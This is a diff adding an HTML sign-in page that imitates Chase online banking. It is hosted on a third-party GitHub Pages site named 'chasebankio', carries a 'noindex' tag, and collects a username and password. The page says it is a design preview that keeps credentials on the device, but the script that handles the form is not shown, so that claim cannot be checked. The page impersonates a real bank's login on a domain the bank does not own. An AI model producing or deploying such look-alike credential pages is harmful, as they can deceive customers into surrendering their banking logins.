@@ -1,0 +1,104 @@
+<!doctype html>
+<html lang="en" class="no-js">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="theme-color" content="#005EB8">
+  <title>Secure Sign In | Chase Online</title>
+  <meta name="description" content="Sign in to Chase online banking — or choose passwordless sign-in. Your credentials stay on this device in this design preview.">
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <link rel="apple-touch-icon" href="apple-touch-icon.png">
+  <link rel="manifest" href="manifest.webmanifest">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Chase">
+  <meta property="og:title" content="Secure Sign In | Chase Online">
+  <meta property="og:description" content="Sign in to Chase online banking — or choose passwordless sign-in. Your credentials stay on this device in this design preview.">
+  <meta property="og:image" content="https://leephil1907-lab.github.io/chasebankio/images/advisor.jpg">
+  <meta property="og:url" content="https://leephil1907-lab.github.io/chasebankio/sign-in.html">
+  <meta name="twitter:card" content="summary_large_image">
+  <link rel="canonical" href="https://leephil1907-lab.github.io/chasebankio/sign-in.html">
+  <link rel="preload" href="fonts/open-sans.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="styles.css">
+  <script>document.documentElement.classList.remove('no-js');document.documentElement.classList.add('js','is-loading');</script>
+</head>
+<body id="top" data-page="signin" data-nav="personal">
+  <a class="skip-link" href="#main">Skip to main content</a>
+  <noscript><p class="ns-note">This preview needs JavaScript for navigation. <a href="index.html">Return to the home page</a>.</p></noscript>
+
+  <div class="page-skeleton" aria-hidden="true">
+    <div class="wrap">
+      <div class="sk sk-utility"></div>
+      <div class="sk sk-logo"></div>
+      <div class="sk sk-nav"></div>
+      <div class="sk sk-hero"></div>
+      <div class="sk-row"><div class="sk sk-card"></div><div class="sk sk-card"></div><div class="sk sk-card"></div></div>
+    </div>
+  </div>
+
+  <header class="site-header" id="siteHeaderSlot"></header>
+
+  <main id="main">
+    <section class="page-hero">
+      <div class="wrap">
+        <nav class="crumbs" aria-label="Breadcrumb"><a href="index.html">Home</a><svg aria-hidden="true"><use href="#ic-chevron-right"/></svg><span class="crumb-here" aria-current="page">Sign in</span></nav>
+        <p class="eyebrow">Sign in</p>
+        <h1>Welcome back to Chase</h1>
+        <p class="lede">Sign in to view accounts, move money and manage cards &mdash; this design preview keeps everything on your device.</p>
+      </div>
+    </section>
+
+    <section class="section">
+      <div class="wrap auth-wrap">
+        <div class="auth-card" id="signinPageCard" role="region" aria-label="Sign in form">
+          <h2>Sign in to your account</h2>
+          <p class="sub">Enter your username and password to continue.</p>
+          <form id="signinPageForm" autocomplete="on">
+            <div class="field">
+              <label for="pgUsername">Username</label>
+              <input id="pgUsername" name="username" type="text" autocomplete="username" spellcheck="false" maxlength="60" required>
+            </div>
+            <div class="field">
+              <label for="pgPassword">Password</label>
+              <div class="pw-wrap">
+                <input id="pgPassword" name="password" type="password" autocomplete="current-password" maxlength="64" required>
+                <button type="button" class="pw-toggle" id="pgPwToggle" aria-pressed="false">Show</button>
+              </div>
+            </div>
+            <div class="signin-row">
+              <label class="check-row"><input type="checkbox" id="pgRemember"> Remember username</label>
+              <a class="token-link" href="https://secure.chase.com/web/auth/dashboard" target="_blank" rel="noopener">Use token <svg class="chev-r" aria-hidden="true"><use href="#ic-chevron-right"/></svg></a>
+            </div>
+            <div class="signin-status" id="pgNotice" role="status" hidden></div>
+            <button class="btn btn-blue btn-block" type="button" id="pgSubmit">Sign in</button>
+            <div class="or-divider" role="separator"><span>Or</span></div>
+            <button class="btn btn-outline btn-block" type="button" id="pgPasswordless">Passwordless sign in</button>
+            <div class="signin-links">
+              <a id="help" href="#help">Forgot username/password? <svg class="chev-r" aria-hidden="true"><use href="#ic-chevron-right"/></svg></a>
+              <a href="sign-up.html">Not Enrolled? Sign Up Now. <svg class="chev-r" aria-hidden="true"><use href="#ic-chevron-right"/></svg></a>
+            </div>
+          </form>
+        </div>
+        <aside class="auth-side">
+          <h2>First time signing in here?</h2>
+          <ul>
+            <li><svg aria-hidden="true"><use href="#ic-check"/></svg><span>Your username and password never leave this device in this preview.</span></li>
+            <li><svg aria-hidden="true"><use href="#ic-check"/></svg><span>Enroll in under five minutes with your account details.</span></li>
+            <li><svg aria-hidden="true"><use href="#ic-check"/></svg><span>Set a reminder and we'll remember your username on this browser.</span></li>
+          </ul>
+          <div class="page-hero-actions">
+            <a class="btn btn-blue" href="sign-up.html">Enroll now</a>
+            <a class="btn btn-outline" href="support.html">Contact support</a>
+          </div>
+        </aside>
+      </div>
+    </section>
+  </main>
+
+  <footer class="site-footer" id="siteFooterSlot"></footer>
+
+  <script src="chrome.js" defer></script>
+  <script src="site-index.js" defer></script>
+  <script src="app.js" defer></script>
+</body>
+</html>
